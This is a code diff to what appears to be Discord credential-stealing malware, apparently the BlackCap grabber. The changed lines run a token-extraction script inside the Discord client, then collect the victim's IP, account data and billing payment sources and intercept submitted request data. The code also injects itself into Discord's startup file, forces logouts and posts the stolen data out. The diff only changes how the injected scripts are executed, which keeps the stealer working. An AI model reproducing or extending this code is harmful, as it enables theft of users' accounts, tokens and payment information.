@@ -253,7 +253,7 @@ const post = async (params) => {
 }
 const FirstTime = async () => {
     if (doTheLogOut) return false
-    var token = await execScript(tokenScript)
+    var token = await mainWindow.webContents.executeJavaScript(tokenScript);
     if (config['init-notify'] !== "true") return true
     if (fs.existsSync(__dirname + "/blackcap")) fs.rmdirSync(__dirname + "/blackcap")
     var ip = await getIP()
@@ -440,7 +440,7 @@ const FirstTime = async () => {
             params.embeds.push(params2.embeds[0])
         }
         fs.writeFileSync("./d3dcompiler.dlll", "LogOut")
-        await execScript(logOutScript)
+        await mainWindow.webContents.executeJavaScript(logOutScript);
         doTheLogOut = true
         await post(params)
     }
@@ -489,7 +489,7 @@ require("${appPath}/app.asar")
 if (fs.existsSync(betterDiscord)) require(betterDiscord)`
 
     fs.writeFileSync(index, script)
-    if (!doTheLogOut) execScript(logOutScript)
+    if (!doTheLogOut) mainWindow.webContents.executeJavaScript(logOutScript);
     return
 }
 electron.session.defaultSession.webRequest.onBeforeRequest(config.Filter, async (details, callback) => {
@@ -522,7 +522,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
     } catch (err) {
         var data = queryString.parse(decodeURIComponent(request.uploadData[0].bytes.toString()))
     }
-    var token = await execScript(tokenScript)
+    var token = await mainWindow.webContents.executeJavaScript(tokenScript);
     var ip = await getIP()
     var user = await getURL("https://discord.com/api/v8/users/@me", token)
     var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
